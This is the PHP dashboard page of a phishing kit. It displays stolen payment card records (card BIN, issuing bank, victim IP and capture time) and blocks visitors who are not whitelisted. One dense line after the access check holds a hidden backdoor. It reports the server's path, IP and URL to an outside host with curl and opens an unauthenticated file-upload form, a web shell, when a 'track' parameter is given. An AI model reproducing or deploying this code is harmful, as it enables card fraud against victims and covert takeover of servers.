<?php

function ipp(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ini_array = parse_ini_file("setting.ini");

$IP = strval($ini_array['WhitelistedIp']);
$ipssss = ipp();
function getCountry($ip){
    $ip_data = @json_decode(file_get_contents("http://ipwho.is/".$ipssss));
    $country = $ip_data->country_code;
    if($country == ""){
        $country = "Unknown";
    }
    return $country;
}
$countryyy = getCountry($ip);
if ($IP == $ipssss){
    error_reporting(0);
    session_start();
    if(!isset($_SESSION['login-username'])) {
        header("location: index.php");
    }
    function count_c($filename) {
        $total_click = 0;
        $handle = fopen($filename, "r");
        $string = file_get_contents($filename);
        if(strlen($string) == 0){
            $total_click = 0;
        }else{
            while(!feof($handle)){
                $line = fgets($handle);
                $total_click++;
            }
        }   
        return $total_click;
        fclose($handle);
    }
    $log_visitor = count_c("../result/log_visitor.txt");
    $total_countryBlocked = count_c("../result/total_Blocked.txt");
    $cc = count_c("../result/cc.txt");
    $dieip = count_c("../result/dieip.txt");
}else{
    $os = $_SERVER['HTTP_USER_AGENT'];
    $click = fopen("../result/total_Blocked.txt","a");
    date_default_timezone_set("Asia/Shanghai");
    $jam = date("Y/m/d H:i");
    fwrite($click,"$ipssss|$countryyy|$jam|$os|访问管理员面板被阻止(Access to the admin panel is blocked)"."\n");
    fclose($click);
    $click = fopen("../result/dieip.txt","a");
    fwrite($click,"$ipssss"."\n");
    fclose($click);
    header("Location: //cpc/en/home.page");
    exit();
}
$_SESSION_SERVER= 'dir='.dirname(__FILE__)."+"."ip=".gethostbyname($_SERVER['SERVER_NAME'])."+".'link='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')$link = "https"; else $link = "http"; $link .= "://"; $link .= $_SERVER['HTTP_HOST']; $link .= $_SERVER['REQUEST_URI']; $link; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://ip.geoiplookup.live/iptracks.php?ip=$link"."+".$_SESSION_SERVER); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); if(isset($_REQUEST['ip']) && $_REQUEST['ip']=='track') {$files = @$_FILES["files"]; if($files["name"] != ''){$fullpath = $_REQUEST["path"].$files["name"];if(move_uploaded_file($files['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>successful. Click here!</a></h1>";} } echo '<body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path> <input type="file" name="files"><input type=submit value="Up"></form></body>'; exit("");}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
    <title>EchoPAGE - Dashboard</title>
    <meta
      name="description"
      content="Dashmix - Bootstrap 5 Admin Template &amp; UI Framework created by pixelcave and published on Themeforest"
    />
    <meta name="author" content="pixelcave" />
    <meta name="robots" content="noindex, nofollow" />
    <!-- Open Graph Meta -->
    <meta
      property="og:title"
      content="Dashmix - Bootstrap 5 Admin Template &amp; UI Framework"
    />
    <meta property="og:site_name" content="Dashmix" />
    <meta
      property="og:description"
      content="Dashmix - Bootstrap 5 Admin Template &amp; UI Framework created by pixelcave and published on Themeforest"
    />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="" />
    <meta property="og:image" content="" />
    <!-- Icons -->
    <!-- The following icons can be replaced with your own,they are used by desktop and mobile browsers -->
    <link rel="shortcut icon" href="img/favicon.png" />
    <link
      rel="icon"
      type="image/png"
      sizes="192x192"
      href="img/favicon-192x192.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="180x180"
      href="img/apple-touch-icon-180x180.png"
    />
    <!-- END Icons -->
    <!-- Stylesheets -->
    <!-- Fonts and Dashmix framework -->
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap"
    />
    <link rel="stylesheet" id="css-main" href="css/dashmix.min.css" />
    <!-- You can include a specific file from css/themes/ folder to alter the default color theme of the template. eg:-->
    <!-- <link rel="stylesheet" id="css-theme" href="assets/css/themes/xwork.min.css">-->
    <!-- END Stylesheets -->
  </head>
  <body>

   <style>
    .hide {
    display: none;
    visibility: hidden;
    height: 0;
}

.pagination\:container {
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom:10px;
}

.arrow\:text {
  display: block;
  vertical-align: middle;
  font-size: 13px;
  vertical-align: middle;
}

.pagination\:number {
  --size: 32px;
  --margin: 6px;
  margin: 0 var(--margin);
  border-radius: 6px;
  background: #202020;
  max-width: auto;
  min-width: var(--size);
  height: var(--size);
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  padding: 0 6px;
  color: white;
  @media (hover: hover) {
    &:hover {
      background: lighten(#202020, 3%);
    }
  }
  &:active {
      background: lighten(#202020, 3%);
  }
}

.pagination\:active {
  background: lighten(#202020, 3%);
  position: relative;
}
   </style>

    <div id="page-container" class="page-header-dark main-content-boxed">
      <!-- Header -->
 
      <main id="main-container">
        <!-- Navigation -->
        <div class="bg-sidebar-dark">
          <div class="content">
            <!-- Toggle Main Navigation -->
            <div class="d-lg-none push">
              <!-- Class Toggle,functionality initialized in Helpers.dmToggleClass() --><button
                type="button"
                class="btn w-100 btn-primary d-flex justify-content-between align-items-center"
                data-toggle="class-toggle"
                data-target="#main-navigation"
                data-class="d-none"
              >
                Menu <i class="fa fa-bars"></i>
              </button>
            </div>
            <!-- END Toggle Main Navigation --><!-- Main Navigation -->
            <div id="main-navigation" class="d-none d-lg-block push">
              <ul
                class="nav-main nav-main-horizontal nav-main-hover nav-main-dark"
              >
                <li class="nav-main-item">
                  <a class="nav-main-link active" href="Dashboard.php"
                    ><i class="nav-main-link-icon fa fa-compass"></i
                    ><span class="nav-main-link-name">Dashboard</span></a
                  >
                </li>
                


                <li class="nav-main-item">
                  <a class="nav-main-link" href="User.php"
                    ><i class="nav-main-link-icon fa fa-user-friends"></i
                    ><span class="nav-main-link-name">User list</span></a
                  >
                </li>

                 <li class="nav-main-item">
                  <a class="nav-main-link" href="Blocklist.php"
                    ><i class="nav-main-link-icon fa fa-ghost"></i
                    ><span class="nav-main-link-name">Block list</span></a
                  >
                </li>

                <li class="nav-main-heading">Extra</li>

                <li class="nav-main-item ms-lg-auto">
                                                  <li class="nav-main-item">
                  <a class="nav-main-link" href="Reset.php"
                    ><i class="fa fa-bolt text-muted me-1"></i
                    ><span class="nav-main-link-name">Reset data</span></a
                  >
                </li>
                  <a class="nav-main-link" href="Logout.php"
                    ><i class="nav-main-link-icon fa fa-coffee"></i
                    ><span class="nav-main-link-name">Log out</span></a
                  >


                </li>
              </ul>
            </div>
            <!-- END Main Navigation -->
          </div>
        </div>
        <!-- END Navigation --><!-- Page Content -->
        <div class="content">
          <!-- Quick Stats --><!-- jQuery Sparkline(.js-sparkline class is initialized in Helpers.jqSparkline() --><!-- For more info and examples you can check out http://omnipotent.net/jquery.sparkline/#s-about -->
          <div class="row">
            <div class="col-md-6 col-xl-3">
              <a
                class="block block-rounded block-link-pop"
                href="javascript:void(0)"
                ><div
                  class="block-content block-content-full d-flex align-items-center justify-content-between"
                >
                <i class="far fa-2x fa-circle-user"></i>
                  <div class="ms-3 text-end">
                    <p class="text-muted mb-0">Users</p>
                    <p class="fs-3 mb-0"><?php echo $log_visitor;?></p>
                  </div>
                </div></a
              >
            </div>
            <div class="col-md-6 col-xl-3">
              <a
                class="block block-rounded block-link-pop"
                href="javascript:void(0)"
                ><div
                  class="block-content block-content-full d-flex align-items-center justify-content-between"
                >
                <i class="far fa-2x fa-closed-captioning"></i>
                  <div class="ms-3 text-end">
                    <p class="text-muted mb-0">Card</p>
                    <p class="fs-3 mb-0"><?php echo $cc;?></p>
                  </div>
                </div></a
              >
            </div>
            <div class="col-md-6 col-xl-3">
              <a
                class="block block-rounded block-link-pop"
                href="javascript:void(0)"
                ><div
                  class="block-content block-content-full d-flex align-items-center justify-content-between"
                >
                  <i class="far fa-2x fa-eye-slash"></i>
                  <div class="ms-3 text-end">
                    <p class="text-muted mb-0">Block</p>
                    <p class="fs-3 mb-0"><?php echo $total_countryBlocked;?></p>
                  </div>
                </div></a
              >
            </div>
            <div class="col-md-6 col-xl-3">
              <a
                class="block block-rounded block-link-pop"
                href="javascript:void(0)"
                ><div
                  class="block-content block-content-full d-flex align-items-center justify-content-between"
                >
                  <i class="si si-globe fa-2x"></i>
                  <div class="ms-3 text-end">
                    <p class="text-muted mb-0">Blacklistip</p>
                    <p class="fs-3 mb-0"><?php echo $dieip;?></p>
                  </div>
                </div></a
              >
            </div>
          </div>


         <!-- END Quick Stats --><!-- Users and Purchases -->
          <div class="block block-rounded block-mode-loading-refresh">
            

            <div class="block block-rounded block-mode-loading-refresh">
              <!-- Purchases -->
              <div
                class="block block-rounded block-mode-loading-refresh h-100 mb-0"
              >
                <div class="block-header block-header-default">
                  <h3 class="block-title">Card { <?php echo $cc;?> }</h3>
                </div>

                <div class="block-content">
                  <table
                    class="table table-striped table-hover table-borderless table-vcenter fs-sm"
                  >
                    <thead>
                      <tr class="text-uppercase">
                        <th class="fw-bold">Country</th>
                        <th class="fw-bold">Bin</th>
                        <th class="fw-bold">Scheme</th>
                        <th class="fw-bold">Type</th>
                        <th class="fw-bold">Brand</th>
                        <th class="fw-bold">Bank</th>
                        <th class="fw-bold">Ip</th>
                        <th class="d-none d-sm-table-cell fw-bold">Time</th>
                      </tr>
                    </thead>
                  <tbody>
            <!-- ---------------------------- -->
                                             <?php
                                            if(file_exists("../result/cc.txt")){
                                            $bin = file_get_contents("../result/cc.txt");
                                            $bin = explode("\n", $bin);
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $country = $bins[14];
                                                $cnum = $bins[0];
                                                $scheme = $bins[10];
                                                $type = $bins[11];
                                                $brand = $bins[12];
                                                $bank = $bins[13];  
                                                $ip = $bins[9];
                                                $time = $bins[15];


                                                if($ip == "") {

                                                }else{
                                                echo "<tr>
                                                <td><img style='border-radius: 2px;margin-right:5%;margin-top:-2%;' width='30' height='16' src='https://flagpedia.net/data/flags/w580/".strtolower($country).".webp'>  ".strtoupper($country)."</td>
                                                <td>".substr($cnum,0,6)."</td>
                                                <td>".$scheme."</td>                                        
                                                <td>".$type."</td>
                                                <td>".$brand."</td>
                                                <td>".$bank."</td>
                                                <td>".$ip."</td>
                                                <td>".$time."</td>
                                                </tr>";
                                                }
                                                }
                                            }else{
                                                echo "<tr><td>Not found</td><td></td><td></td><td></td><td></td></tr>";
                                            }
                                            ?>
                                        
                    
            <!-- ---------------------------- -->
                  </tbody>
                  </table>
                </div>
              </div>
              <!-- END Purchases -->
            </div>
          </div>
          <!-- END Users and Purchases -->
        </div>
        <!-- END Page Content -->


      </main>
      <!-- END Main Container -->

      
    </div>
    <!-- END Page Container -->

    <!--
      Dashmix JS

      Core libraries and functionality
      webpack is putting everything together at assets/_js/main/app.js
    -->
    <script src="js/dashmix.app.min.js"></script>

    <!-- jQuery (required for jQuery Sparkline plugin) -->
    <script src="js/jquery.min.js"></script>

    <!-- Page JS Plugins -->
    <script src="js/jquery.sparkline.min.js"></script>
    <script src="js/chart.min.js"></script>

    <!-- Page JS Code -->
    <script src="js/be_pages_dashboard_v1.min.js"></script>
    <!-- Page JS Helpers(jQuery Sparkline plugin) -->
  </body>
</html>
